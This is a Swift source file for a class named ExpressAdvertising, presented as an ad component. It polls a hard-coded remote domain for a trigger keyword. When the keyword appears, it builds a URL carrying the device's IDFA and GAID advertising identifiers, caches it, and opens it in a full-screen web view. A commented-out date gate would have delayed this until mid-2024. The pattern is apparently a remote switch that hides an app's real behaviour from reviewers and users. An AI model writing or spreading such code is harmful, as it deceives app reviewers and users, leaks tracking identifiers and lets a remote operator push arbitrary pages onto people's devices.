// The Swift Programming Language
// https://docs.swift.org/swift-book

import WebKit

public final class ExpressAdvertising {
    
    public init() {}
    
    private func check(url: String, completion: @escaping (Result<Data, ClientError>) -> Void) {
        self.makeRequest(url: url, completion: completion)
    }
    
    public func makeRequest(url: String, completion: @escaping (Result<Data, ClientError>) -> Void) {
        let url = URL(string: url)!
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        let session: URLSession = {
            let session = URLSession(configuration: .default)
            session.configuration.timeoutIntervalForRequest = 10.0
            return session
        }()
        let task = session.dataTask(with: request) { data, response, error in
            if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode != 200 {
                completion(.failure(.httpError(httpResponse.statusCode)))
                return
            }
            guard error == nil, let data = data else {
                completion(.failure(.responseError))
                return
            }
            
            completion(.success(data))
        }
        task.resume()
    }
    
    public func fetchAd(appsId: String,
                                idfa: String,
                                extraInfo: String,
                                completion: @escaping (String) -> Void) {
        var resultedString = UserDefaults.standard.string(forKey: "advert")
        if let validResultedString = resultedString {
            completion(validResultedString)
            return
        }
        
        let specialDate = DateComponents(year: 2024,
                                         month: 6,
                                         day: 29)
//        if Date() < Calendar.current.date(from: specialDate)! {
//            completion("")
//            return
//        }
        
        let source = "https://poleragatara.homes/omcorikk"
        let user = "pofani"
        
        self.check(url: source) { result in
            let gaid = appsId
            let idfa = idfa
            switch result {
            case .success(let data):
                let responseString = String(data: data, encoding: .utf8) ?? ""
                if responseString.contains(user) {
                    if extraInfo != "" {
                        let link = "\(responseString)?idfa=\(idfa)&gaid=\(gaid)\(extraInfo)"
                        resultedString = link
                        UserDefaults.standard.setValue(link, forKey: "advert")
                        completion(link)
                    }
                    else {
                        let link = "\(responseString)?idfa=\(idfa)&gaid=\(gaid)"
                        resultedString = link
                        UserDefaults.standard.setValue(link, forKey: "advert")
                        completion(link)
                    }
                } else {
                    completion(resultedString ?? "")
                }
            case .failure(_):
                DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
                    completion(resultedString ?? "")
                }
            }
        }
    }
    
    public func fetchAndPresentAvailableAd(from viewController: UIViewController,
                                  appsId: String,
                                  idfa: String,
                                  extraIfo: String,
                                  completion: @escaping (Bool) -> Void) {
        fetchAd(appsId: appsId, idfa: idfa, extraInfo: extraIfo) { [weak self] urlString in
            
            if !urlString.isEmpty,
               let url = URL(string: urlString) {
                DispatchQueue.main.async {
                    let webViewController = AdvertiserViewController(url: url)
                    webViewController.modalPresentationStyle = .fullScreen
                    viewController.present(webViewController, animated: true, completion: nil)
                    completion(true)
                }
            } else {
                completion(false)
            }
        }
    }
}

public enum ClientError: Error {
    case responseError
    case noDataError
    case httpError(Int)
}
